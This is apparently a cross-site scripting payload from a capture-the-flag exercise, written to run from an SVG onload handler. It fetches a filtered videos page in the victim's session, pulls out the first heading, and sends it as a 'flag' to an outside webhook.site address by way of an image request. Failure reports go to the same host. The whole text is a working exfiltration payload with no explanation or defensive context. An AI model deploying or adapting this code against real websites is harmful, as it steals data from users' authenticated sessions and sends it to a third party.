svg.onload:
fetch('/videos?filter=ncsc')
  .then(r => r.text())
  .then(t => {
    const match = t.match(/<h2[^>]*>(.*?)<\/h2>/);
    if (match) {
      new Image().src = 'https://webhook.site/e384bc4d-14d1-4f4d-a359-a99b9431d317?flag=' + encodeURIComponent(match[1]);
    } else {
      new Image().src = 'https://webhook.site/e384bc4d-14d1-4f4d-a359-a99b9431d317?fail=nomatch';
    }
  })
  .catch(e => {
    new Image().src = 'https://webhook.site/e384bc4d-14d1-4f4d-a359-a99b9431d317?fail=error';
  });
